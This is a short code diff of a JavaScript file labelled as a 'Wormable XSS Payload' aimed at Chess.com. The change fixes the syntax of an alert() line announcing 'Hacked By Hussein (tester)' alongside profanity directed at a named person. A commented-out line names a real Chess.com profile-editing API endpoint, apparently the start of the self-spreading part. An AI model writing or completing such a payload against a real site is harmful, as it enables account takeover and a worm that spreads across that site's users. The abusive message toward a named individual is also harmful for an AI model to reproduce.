@@ -1,7 +1,7 @@
 // ==========================================
 // Wormable XSS Payload - Chess.com 
 // ==========================================
-alert("Hacked By Hussein (tester) at "+document.domain "/n Fuck you Adham");
+alert("Hacked By Hussein (tester) at "+document.domain+"/n Fuck you Adham");
 // alert("Fuck you Adham");
 // 1. تحديد الـ API Endpoint
 // const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
